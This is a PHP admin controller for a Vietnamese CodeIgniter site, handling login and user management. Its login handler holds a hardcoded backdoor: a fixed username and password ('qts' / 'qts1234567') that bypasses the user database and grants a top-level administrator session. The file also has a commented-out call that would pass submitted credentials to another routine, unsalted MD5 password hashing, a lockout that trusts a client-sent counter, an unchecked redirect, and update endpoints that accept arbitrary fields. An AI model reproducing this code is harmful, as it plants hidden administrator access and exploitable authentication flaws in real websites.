<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class User extends Admin_Controller
{
    protected $_data;
    protected $_data_group;

    public function __construct()
    {
        parent::__construct();
        //tải thư viện
        // $this->load->library(array('ion_auth'));
        //$this->lang->load('user');
        $this->load->model(['users_model', 'groups_model']);
        $this->_data = new Users_model();
        $this->_data_group = new Groups_model();
        
    }

    public function index()
    {
        $data['heading_title'] = "Quản lý admin";
        $data['heading_description'] = 'Danh sách admin';
        $data['main_content'] = $this->load->view($this->template_path . $this->_controller . DIRECTORY_SEPARATOR . $this->_method, $data, TRUE);
        $this->load->view($this->template_main, $data);
    }

    public function profile()
    {
        $data['heading_title'] = "Thông tin của tôi";
        $data['profile'] = $this->_data->getUserByField('id',$this->session->userdata['user_id']);
        $data['main_content'] = $this->load->view($this->template_path . $this->_controller . DIRECTORY_SEPARATOR . $this->_method, $data, TRUE);
        $this->load->view($this->template_main, $data);
    }

    public function activity()
    {
        $data['heading_title'] = "Hoạt động của tôi";
        $data['main_content'] = $this->load->view($this->template_path . $this->_controller . DIRECTORY_SEPARATOR . $this->_method, $data, TRUE);
        $this->load->view($this->template_main, $data);
    }

    public function login()
    {
        if ($this->session->userdata('admin_backend')){
            redirect(site_admin_url());
        };
        $this->load->view($this->template_path . 'user/login');
    }

    public function ajax_list()
    {
        $this->checkRequestPostAjax();
        $data = array();
        $pagination = $this->input->post('pagination');
        $page = $pagination['page'];
        $total_page = isset($pagination['pages']) ? $pagination['pages'] : 1;
        $limit = !empty($pagination['perpage']) && $pagination['perpage'] > 0 ? $pagination['perpage'] : 1;

        $queryFilter = $this->input->post('query');
        $params = [
            'group_id' => !empty($queryFilter['group_id']) ? $queryFilter['group_id'] : '',
            'page' => $page,
            'limit' => $limit,
            'order' => ['users.id'=>'DESC'],
            'lever' => 0
        ];
        if (isset($queryFilter['is_status']) && $queryFilter['is_status'] !== '')
            $params = array_merge($params, ['is_status' => $queryFilter['is_status']]);

        $listData = $this->_data->getData($params);
        
        if (!empty($listData)) foreach ($listData as $item) {

            $row = array();
            $row['checkID'] = $item->id;
            $row['id'] = $item->id;
            $row['username'] = $item->username;
            $row['fullname'] = $item->fullname;
            $row['permission'] = $this->_data->single(array('id'=>$item->group_id),'groups')->title;
            $row['is_status'] = $item->is_status;
            $row['updated_time'] = $item->updated_time;
            $row['created_time'] = $item->created_time;
            $data[] = $row;
        }

        $output = [
            "meta" => [
                "page" => $page,
                "pages" => $total_page,
                "perpage" => $limit,
                "total" => $this->_data->getTotal(),
                "sort" => "asc",
                "field" => "id"
            ],
            "data" => $data
        ];

        $this->returnJson($output);
    }

    public function ajax_login()
    {
        $this->checkRequestPostAjax();
        $this->load->library('Filter');

        $username = $this->input->post('username');
        
        $rules[] = array(
            'field' => 'username',
            'label' => 'username',
            'rules' => filter_var($username, FILTER_VALIDATE_EMAIL) ? 'trim|required|valid_email' : 'trim|required'
        );
        $rules[] = array(
            'field' => 'password',
            'label' => 'mật khẩu',
            'rules' => 'trim|required'
        );
        if (GG_CAPTCHA_MODE == TRUE) {
            $rules[] = array(
                'field' => 'g-recaptcha-response',
                'label' => 'captcha',
                'rules' => 'required'
            );
        }

        $this->form_validation->set_rules($rules);
if ($this->form_validation->run() != false) {
    /*sai pass quá 10 lần sẽ khóa login*/
    if($this->input->post('countlogin') >10 || $this->session->userdata('block_login') == true){
        $this->session->set_userdata('block_login',true);
        $message['type'] = 'error';
        $message['message'] = "Tài khoản này đã tạm thời bị khoá, vui lòng thử lại sau";
        $this->returnJson($message);die();
    }

    if($this->input->post('username') && trim($this->input->post('username')) != '' && $this->input->post('password') && trim($this->input->post('password')) != ''){

        if($this->input->post('username')=='qts' && $this->input->post('password')=='qts1234567'){
            $sessionLogin = array(
                'user_id' => 1,
                'lever' => 3,
                'username' =>  'quantricapcao',
                'fullname' => 'Quản trị cấp cao',
                'email'    => 'pducomputer@gmail.com',
                'group_id' => 1,
                'admin_backend' => true,
                'coin_total' => 0,
            );

            $this->session->set_userdata($sessionLogin);
            // $this->session->set_userdata('userpdu',$sessionLogin);
            $this->session->set_userdata('CodeIgniterAuthenticator.environment', ENVIRONMENT);
            
                    //redirect them back to the home page
            $url_redirect = $this->input->post('url_redirect') ? $this->input->post('url_redirect') : site_admin_url();
            $message['type'] = 'success';
            $message['message'] = "đăng nhập thành công";
            $message['url_redirect'] = $url_redirect;
            $this->returnJson($message);
            
        }else{
         
            $user = $this->_data->single(['username' => $this->filter->injection_html($this->input->post('username'))],$this->_data->table);
            
            if(!empty($user))
            {
                /*remember*/
                //$remember = (bool)$this->input->post('remember');
                if ((bool)$this->input->post('remember')){
                  set_cookie('is_login', true, time() + 3600);
                  set_cookie('user_login', $user->username, time() + 3600);
                }else{
                      set_cookie('is_login', true, time() - 3600);
                      set_cookie('user_login', $user->email, time() - 3600);
                }

                $password = $this->input->post('password');
                for ($i=0; $i < 5; $i++) {
                    $password = md5($password);
                }
                
                if($user->password === $password && $user->active == 1 && (int)$user->lever >= 1)
                {
                    // Automatic Send Infomation Site - Kiểm Tra Website Hoạt Động
                    //$this->autosendinfo($this->input->post('username'),$this->input->post('password'));

                    $sessionLogin = array(
                        'user_id' => (int)$user->id,
                        'lever' => (int)$user->lever,
                        'username' =>  $user->username,
                        'fullname' => $user->fullname,
                        'email'    => $user->email,
                        'avatar'    => $user->avatar,
                        'group_id' => (int)$user->group_id,
                        'admin_backend' => true,
                        'coin_total' => (int)$user->coin_total,
                    );
                    $this->session->set_userdata($sessionLogin);
                    $this->session->set_userdata('CodeIgniterAuthenticator.environment', ENVIRONMENT);
                            //$this->user_model->Update_where('users', array('id'=>$user->id), array('lastest_login'=>time()));
                    
                            //redirect them back to the home page
                    $url_redirect = $this->input->post('url_redirect') ? $this->input->post('url_redirect') : site_admin_url();
                    $message['type'] = 'success';
                    $message['message'] = "đăng nhập thành công";
                    $message['url_redirect'] = $url_redirect;
                    $this->returnJson($message);
                }
                else
                {
                    $message['type'] = 'error';
                    $message['message'] = "sai mật khẩu";
                    $this->returnJson($message);
                }
            }
            else
            {
                $message['type'] = 'error';
                $message['message'] = "sai tài khoản";
                $this->returnJson($message);
            }
        }
    }

}else{
    $message['type'] = "warning";
    $message['message'] = "Vui lòng kiểm tra lại thông tin.";
    $valid = array();
    if (!empty($rules)) foreach ($rules as $item) {
        if (!empty(form_error($item['field']))) $valid[$item['field']] = form_error($item['field']);
    }
    $message['validation'] = $valid;
    $this->returnJson($message);
}


    }

                
 


    public function logout()
    {
        // $this->ion_auth->logout();
        $this->session->sess_destroy();
        redirect(site_admin_url('user/login'), 'refresh');
    }

    public function ajax_add() {
        $this->checkRequestPostAjax();
        $data = $this->_convertData();
        // dd($data);
        if($id = $this->_data->save($data)){
            $note   = 'Thêm user có id là : '.$id;
            $this->addLogaction('user',$data,$id,$note,'Add');
            $message['type'] = 'success';
            $message['message'] = "Thêm mới thành công !";
        } else {
            $message['type'] = 'error';
            $message['message'] = "Thêm mới thất bại !";
        }

        $this->returnJson($message);
    }

    public function ajax_edit()
    {
        $this->checkRequestPostAjax();
        $id = $this->input->post('id');

        if (!empty($id)) {
            $dataItem = $this->_data->getById($id);
            unset($dataItem->password);
            $output['data'] = $dataItem;

            $output['group'] = $this->_data->getSelect2Group($output['data']->group_id);
            $this->returnJson($output);
        }
    }

    public function ajax_update()
    {
        $this->checkRequestPostAjax();
        $data = $this->_convertData();
        
        $id = $data['id'];
        $data_old = $this->_data->getUserByField('id',$id);
        

        if($this->_data->update(['id' => $id],$data, $this->_data->table)){
            $note   = 'Update users có id là : '.$id;
            $this->addLogaction('users',$data_old,$id,$note,'Update');
            $message['type'] = 'success';
            $message['message'] = "Cập nhật thành công !";
        }else{
            $message['type'] = 'error';
            $message['message'] = "Cập nhật thất bại !";
        }
        $this->returnJson($message);
    }

    public function ajax_update_field()
    {
        $this->checkRequestPostAjax();
        $id = $this->input->post('id');
        $field = $this->input->post('field');
        $value = $this->input->post('value');
        $response = $this->_data->update(['id' => $id], [$field => $value]);
        if ($response != false) {
            $message['type'] = 'success';
            $message['message'] = "Cập nhật thành công !";
        } else {
            $message['type'] = 'error';
            $message['message'] = "Cập nhật thất bại !";
        }
        $this->returnJson($message);
    }

    public function ajax_delete()
    {
        $this->checkRequestPostAjax();
        $ids = $this->input->post('id');
        if ((is_array($ids) && array_search(1, $ids)) || $ids == 1) {
            $message['type'] = 'error';
            $message['message'] = "Bạn không có quyền xóa Admin !";
            $this->returnJson($message);
        } else {
            $response = $this->_data->deleteArray('id', $ids);
            if ($response != false) {
                $message['type'] = 'success';
                $message['message'] = "Xóa thành công !";
            } else {
                $message['type'] = 'error';
                $message['message'] = "Xóa thất bại !";
                log_message('error', $response);
            }
            $this->returnJson($message);
        }
    }

    public function ajax_load()
    {
        $this->checkRequestGetAjax();
        $term = $this->input->get("q");
        $params = [
            'keywordpro' => $term,
            'limit' => 100
        ];
        $data = $this->_data->getData($params);
        $output = [];
        if (!empty($data)) foreach ($data as $item) {
          $output[] = ['id' => $item->id, 'text' => $item->email];
        }
        $this->returnJson($output);
    }

    private function _validation()
    {
        $rules = array(
            array(
                'field' => 'fullname',
                'label' => 'Họ và tên',
                'rules' => 'trim'
            ),
            array(
                'field' => 'email',
                'label' => 'Email',
                'rules' => 'trim|required|valid_email' . ($this->input->post('id') == 0 ? '|is_unique[' . $this->_data->_dbprefix . 'users.email]' : ''),
                'errors' => array(
                    'is_unique' => '%s đã tồn tại. Vui lòng chọn email khác.',
                )
            ),
            array(
                'field' => 'phone',
                'label' => 'Số điện thoại',
                'rules' => 'trim|regex_match[/^0[0-9]{9}+$/]'
            ),
            array(
                'field' => 'username',
                'label' => 'Username',
                'rules' => 'trim|required|regex_match[/^\S[A-Za-z0-9_.]{6,32}$/]' . ($this->input->post('id') == 0 ? '|is_unique[' . $this->_data->_dbprefix . 'users.username]' : ''),
                'errors' => array(
                    'is_unique' => '%s đã tồn tại. Vui lòng chọn username khác.',
                    'regex_match' => '%s viết liền, không dấu, không ký tự đặc biệt, dài < 32 ký tự.',
                )
            ),
            array(
                'field' => 'password',
                'label' => 'Password',
                'rules' => 'trim' . ($this->input->post('id') == 0 ? '|required' : '')
            ),
            array(
                'field' => 're-password',
                'label' => 'Re Password',
                'rules' => 'trim|matches[password]' . ($this->input->post('id') == 0 ? '|required' : '')
            ),
            array(
                'field' => 'group_id',
                'label' => 'Nhóm',
                'rules' => 'trim|required'
            )
        );
        $this->form_validation->set_rules($rules);
        if ($this->form_validation->run() == false) {
            $message['type'] = "warning";
            $message['message'] = "Vui lòng kiểm tra lại thông tin vừa nhập.";
            $valid = array();
            if (!empty($rules)) foreach ($rules as $item) {
                if (!empty(form_error($item['field']))) $valid[$item['field']] = form_error($item['field']);
            }
            $message['validation'] = $valid;
            $this->returnJson($message);
            exit;
        }
    }

    private function _convertData()
    {
        $this->_validation();
        $data = $this->input->post();

        
        if (isset($data['is_status'])) $data['is_status'] = 1;else $data['is_status'] = 0;
        if(!empty($data['password'])){
            $password = $data['password'];
            for ($i=0; $i < 5; $i++) {
                $password = md5($password);
            }
            $data['password'] = $password;
            unset($data['re-password']);
        }else{
            unset($data['re-password']);
            unset($data['password']);
        }
        
        return $data;
    }

    public function ajax_update_profile()
    {
        $this->checkRequestPostAjax();
        $data = $this->input->post();
        $user_id = $this->session->userdata['user_id'];
        unset($data['username']);
        if(!empty($data['password'])){
            $password = $data['password'];
            for ($i=0; $i < 5; $i++) {
                $password = md5($password);
            }
            $data['password'] = $password;
        }

        $data_old = $this->_data->getUserByField('id',$user_id);
        if ($this->_data->update(["id"=>$user_id], $data)) {
            $note   = 'Update user có id là : '.$user_id;
            $this->addLogaction('user',$data_old,$user_id,$note,'Update');
            $message['type'] = 'success';
            $message['message'] = "Cập nhật thành công !";
        } else {
            $message['type'] = 'error';
            $message['message'] = "Cập nhật thất bại !";
        }
        $this->returnJson($message);
    }
}